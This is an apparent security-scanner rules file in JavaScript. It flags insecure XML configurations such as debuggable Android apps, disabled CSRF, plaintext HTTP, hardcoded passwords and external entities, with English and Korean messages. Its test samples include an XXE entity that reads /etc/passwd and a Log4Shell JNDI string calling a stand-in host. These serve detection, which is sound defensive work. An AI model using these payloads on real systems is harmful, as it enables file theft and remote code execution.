'use strict';

// XML: Android manifests, .NET web.config / app.config, Java web.xml,
// Maven POMs, Spring configuration and network-security configs.

const { maker } = require('./util');

const R = maker('xml', ['xml']);

R('android-debuggable', 'V', 'CR', 10, ['cwe-489', 'owasp-a05', 'android'],
  /\bandroid:debuggable\s*=\s*"true"/,
  ['Android app is debuggable', 'A debuggable release lets anyone attach a debugger and read app data.', 'Remove android:debuggable; build types set it.'],
  ['Android 앱이 디버그 가능합니다', '디버그 가능한 릴리스는 누구나 디버거를 붙여 앱 데이터를 읽게 합니다.', 'android:debuggable을 지우세요. 빌드 유형이 설정합니다.'],
  '<application android:debuggable="true">', '<application android:label="@string/app_name">');
R('android-allow-backup', 'H', 'MA', 5, ['cwe-530', 'android'],
  /\bandroid:allowBackup\s*=\s*"true"/,
  ['Android backup allowed', 'App data, including tokens, is copied into device and cloud backups.', 'Set allowBackup="false" or define backup rules that exclude secrets.'],
  ['Android 백업을 허용합니다', '토큰을 포함한 앱 데이터가 기기와 클라우드 백업으로 복사됩니다.', 'allowBackup="false"로 두거나 시크릿을 빼는 백업 규칙을 정의하세요.'],
  '<application android:allowBackup="true">', '<application android:allowBackup="false">');
R('android-cleartext', 'V', 'MA', 10, ['cwe-319', 'owasp-a02', 'android'],
  /\bandroid:usesCleartextTraffic\s*=\s*"true"|\bcleartextTrafficPermitted\s*=\s*"true"/,
  ['Clear-text traffic allowed', 'The app may send data over plain HTTP.', 'Use https and keep clear-text traffic off.'],
  ['평문 통신을 허용합니다', '앱이 평문 HTTP로 데이터를 보낼 수 있습니다.', 'https를 쓰고 평문 통신을 꺼 두세요.'],
  '<application android:usesCleartextTraffic="true">', '<application android:usesCleartextTraffic="false">');
R('android-exported', 'H', 'MA', 10, ['cwe-926', 'android'],
  /\bandroid:exported\s*=\s*"true"(?![^>]*android:permission\s*=)/,
  ['Exported Android component', 'Any app on the device can start this component and send it data.', 'Set exported="false", or protect it with android:permission.'],
  ['내보낸 Android 구성 요소입니다', '기기의 아무 앱이나 이 구성 요소를 시작하고 데이터를 보낼 수 있습니다.', 'exported="false"로 두거나 android:permission으로 보호하세요.'],
  '<activity android:name=".ShareActivity" android:exported="true">', '<activity android:name=".ShareActivity" android:exported="true" android:permission="com.example.SHARE">');
R('user-certificates-trusted', 'H', 'MA', 10, ['cwe-295', 'android'],
  /<certificates\s+src\s*=\s*"user"/,
  ['User-installed CAs trusted', 'Any certificate the user (or malware) installs can intercept app traffic.', 'Trust only system CAs, plus pinned ones in debug-overrides.'],
  ['사용자가 설치한 CA를 신뢰합니다', '사용자(또는 악성 코드)가 설치한 인증서가 앱 통신을 가로챌 수 있습니다.', '시스템 CA만 신뢰하고 debug-overrides에서만 고정 CA를 쓰세요.'],
  '<certificates src="user" />', '<certificates src="system" />');
R('dotnet-debug-compilation', 'V', 'MA', 10, ['cwe-489', 'owasp-a05'],
  /<compilation\b[^>]*\bdebug\s*=\s*"true"/i,
  ['ASP.NET debug compilation', 'Debug builds are slower and show detailed errors.', 'Set debug="false" for production.'],
  ['ASP.NET 디버그 컴파일입니다', '디버그 빌드는 느리고 자세한 오류를 보여 줍니다.', '운영에서는 debug="false"로 두세요.'],
  '<compilation debug="true" targetFramework="4.8" />', '<compilation debug="false" targetFramework="4.8" />');
R('custom-errors-off', 'V', 'MA', 10, ['cwe-209', 'owasp-a05'],
  /<customErrors\b[^>]*\bmode\s*=\s*"Off"/i,
  ['customErrors mode="Off"', 'Stack traces and code are shown to every visitor.', 'Use mode="RemoteOnly" or "On".'],
  ['customErrors mode="Off"입니다', '스택 추적과 코드가 모든 방문자에게 보입니다.', 'mode="RemoteOnly"나 "On"을 쓰세요.'],
  '<customErrors mode="Off" />', '<customErrors mode="RemoteOnly" />');
R('trace-enabled', 'V', 'MA', 10, ['cwe-489', 'owasp-a05'],
  /<trace\b[^>]*\benabled\s*=\s*"true"(?![^>]*\blocalOnly\s*=\s*"true")/i,
  ['ASP.NET tracing enabled', 'trace.axd exposes requests, headers and session data.', 'Disable tracing in production.'],
  ['ASP.NET 추적을 켭니다', 'trace.axd는 요청, 헤더, 세션 데이터를 노출합니다.', '운영에서는 추적을 끄세요.'],
  '<trace enabled="true" />', '<trace enabled="false" />');
R('http-cookies-insecure', 'H', 'MA', 5, ['cwe-614', 'owasp-a05', 'cookie'],
  /<httpCookies\b(?![^>]*\brequireSSL\s*=\s*"true")[^>]*>|\bhttpOnlyCookies\s*=\s*"false"/i,
  ['Cookies without requireSSL / HttpOnly', 'Cookies are sent over HTTP or readable from script.', 'Set requireSSL="true" and httpOnlyCookies="true".'],
  ['requireSSL / HttpOnly 없는 쿠키입니다', '쿠키가 HTTP로 전송되거나 스크립트가 읽을 수 있습니다.', 'requireSSL="true"와 httpOnlyCookies="true"를 설정하세요.'],
  '<httpCookies httpOnlyCookies="true" />', '<httpCookies httpOnlyCookies="true" requireSSL="true" />');
R('request-validation-off', 'V', 'MA', 10, ['cwe-79', 'owasp-a03'],
  /\bvalidateRequest\s*=\s*"false"|\brequestValidationMode\s*=\s*"2\.0"/i,
  ['Request validation disabled', 'HTML and script in input are accepted without checks.', 'Keep request validation on and encode output.'],
  ['요청 검증을 끕니다', '입력의 HTML과 스크립트를 검사 없이 받아들입니다.', '요청 검증을 켜 두고 출력을 인코딩하세요.'],
  '<pages validateRequest="false" />', '<pages validateRequest="true" />');
R('viewstate-mac-off', 'V', 'CR', 15, ['cwe-642', 'owasp-a08'],
  /\benableViewStateMac\s*=\s*"false"/i,
  ['ViewState MAC disabled', 'Without a MAC, ViewState can be tampered with and deserialized into code execution.', 'Remove the setting; the MAC is required.'],
  ['ViewState MAC을 끕니다', 'MAC이 없으면 ViewState를 조작해 역직렬화로 코드를 실행할 수 있습니다.', '설정을 지우세요. MAC은 필수입니다.'],
  '<pages enableViewStateMac="false" />', '<pages enableViewStateMac="true" />');
R('maven-http-repository', 'V', 'MA', 10, ['cwe-494', 'owasp-a08', 'supply-chain'],
  /<url>\s*http:\/\/(?!localhost|127\.0\.0\.1)/i,
  ['Maven repository over plain HTTP', 'Artifacts downloaded over HTTP can be replaced; Maven 3.8.1+ blocks them.', 'Use the https URL of the repository.'],
  ['평문 HTTP Maven 저장소입니다', 'HTTP로 받은 아티팩트는 바꿔치기될 수 있으며 Maven 3.8.1+는 이를 막습니다.', '저장소의 https URL을 쓰세요.'],
  '<url>http://repo.example.com/maven2</url>', '<url>https://repo.example.com/maven2</url>');
R('maven-dynamic-version', 'S', 'MA', 10, ['supply-chain'],
  /<version>\s*(?:LATEST|RELEASE|\[[^\]<]*,\s*\)|\([^)<]*,\s*\))\s*<\/version>/i,
  ['Dynamic dependency version', 'LATEST, RELEASE and open ranges change the build without any commit.', 'Pin an exact version.'],
  ['동적 의존성 버전입니다', 'LATEST, RELEASE, 열린 범위는 커밋 없이 빌드를 바꿉니다.', '정확한 버전을 고정하세요.'],
  '<version>LATEST</version>', '<version>2.17.1</version>');
R('servlet-cookie-flags', 'H', 'MA', 5, ['cwe-1004', 'owasp-a05', 'cookie'],
  /<(?:http-only|secure)>\s*false\s*<\//i,
  ['Session cookie flag turned off in web.xml', 'The session cookie is sent over HTTP or readable from script.', 'Set <http-only>true</http-only> and <secure>true</secure>.'],
  ['web.xml에서 세션 쿠키 플래그를 끕니다', '세션 쿠키가 HTTP로 전송되거나 스크립트가 읽을 수 있습니다.', '<http-only>true</http-only>와 <secure>true</secure>로 두세요.'],
  '<http-only>false</http-only>', '<http-only>true</http-only>');
R('transport-guarantee-none', 'V', 'MA', 10, ['cwe-319', 'owasp-a02'],
  /<transport-guarantee>\s*NONE\s*<\//i,
  ['transport-guarantee NONE', 'The protected resources may be served over plain HTTP.', 'Use CONFIDENTIAL.'],
  ['transport-guarantee NONE입니다', '보호된 리소스가 평문 HTTP로 제공될 수 있습니다.', 'CONFIDENTIAL을 쓰세요.'],
  '<transport-guarantee>NONE</transport-guarantee>', '<transport-guarantee>CONFIDENTIAL</transport-guarantee>');
R('spring-csrf-disabled', 'H', 'MA', 10, ['cwe-352', 'owasp-a01'],
  /<csrf\b[^>]*\bdisabled\s*=\s*"true"/i,
  ['Spring Security CSRF disabled', 'Browser sessions can be driven by another site to change state.', 'Keep CSRF protection on.'],
  ['Spring Security CSRF를 끕니다', '다른 사이트가 브라우저 세션으로 상태를 바꿀 수 있습니다.', 'CSRF 보호를 켜 두세요.'],
  '<csrf disabled="true"/>', '<csrf/>');
R('hardcoded-password-element', 'V', 'CR', 20, ['cwe-798', 'owasp-a07', 'secrets'],
  /<(?:password|passwd|pwd|secret|apiKey|api-key|privateKey)>\s*(?!\$\{|#\{|%|\{\{|ENC\()[^<\s]{3,}\s*<\//i,
  ['Password in an XML element', 'Anyone who can read the file has the credential.', 'Use a property placeholder resolved from a secret store, or Maven password encryption.'],
  ['XML 요소에 비밀번호가 있습니다', '파일을 읽을 수 있는 누구나 자격 증명을 가집니다.', '시크릿 저장소에서 풀리는 속성 자리표시자나 Maven 비밀번호 암호화를 쓰세요.'],
  '<password>S3cretPass</password>', ['<password>${env.DB_PASSWORD}</password>', '<password>{COQLCE6DU6GtcS5P=}</password>'],
  { skip: (raw) => /<[^>]+>\s*\{[A-Za-z0-9+\/=]+\}\s*</.test(raw) });
R('connection-string-password', 'V', 'CR', 20, ['cwe-798', 'owasp-a07', 'secrets'],
  /\bconnectionString\s*=\s*"[^"]*\b(?:Password|Pwd)\s*=\s*(?!\$\(|%|\{)[^;"]{2,}/i,
  ['Password in a connection string', 'The credential ships with the configuration file.', 'Use integrated security, a managed identity or a secret store.'],
  ['연결 문자열에 비밀번호가 있습니다', '자격 증명이 설정 파일과 함께 배포됩니다.', '통합 보안, 관리 ID, 시크릿 저장소를 쓰세요.'],
  '<add name="Db" connectionString="Server=db;User Id=app;Password=S3cret;" />', '<add name="Db" connectionString="Server=db;Integrated Security=true;" />');
R('external-entity-declared', 'V', 'MA', 10, ['cwe-611', 'owasp-a05', 'xml'],
  /<!ENTITY\s+%?\s*\S+\s+(?:SYSTEM|PUBLIC)\b/i,
  ['External entity declared', 'Parsers that resolve this entity read a file or URL into the document.', 'Remove external entities and disable DTD processing in parsers.'],
  ['외부 엔티티를 선언합니다', '이 엔티티를 해석하는 파서는 파일이나 URL을 문서로 읽어 들입니다.', '외부 엔티티를 지우고 파서에서 DTD 처리를 끄세요.'],
  '<!ENTITY xxe SYSTEM "file:///etc/passwd">', '<!ENTITY company "Example Corp">');
R('http-endpoint', 'H', 'MI', 5, ['cwe-319', 'owasp-a02'],
  /\b(?:url|href|endpoint|address|uri|serviceUrl|baseUrl|value)\s*=\s*"http:\/\/(?!localhost|127\.0\.0\.1|0\.0\.0\.0|schemas\.|www\.w3\.org|xmlns\.)/i,
  ['Endpoint configured over plain HTTP', 'Traffic to this endpoint can be read and changed on the network.', 'Use https.'],
  ['평문 HTTP 엔드포인트를 설정합니다', '이 엔드포인트로 가는 통신은 네트워크에서 읽히고 바뀔 수 있습니다.', 'https를 쓰세요.'],
  '<endpoint address="http://api.example.com/service" />', ['<endpoint address="https://api.example.com/service" />', '<beans xsi:schemaLocation="http://www.springframework.org/schema/beans">']);
R('log4j-jndi-lookup', 'V', 'CR', 20, ['cwe-917', 'owasp-a06'],
  /\$\{jndi:/i,
  ['JNDI lookup in configuration', 'JNDI lookups can load remote code (Log4Shell).', 'Remove the lookup and upgrade Log4j.'],
  ['설정에 JNDI 조회가 있습니다', 'JNDI 조회는 원격 코드를 불러올 수 있습니다(Log4Shell).', '조회를 지우고 Log4j를 업그레이드하세요.'],
  '<Property name="host">${jndi:ldap://evil.example/a}</Property>', '<Property name="host">${env:HOSTNAME}</Property>');

module.exports = { RULES: R.rules };
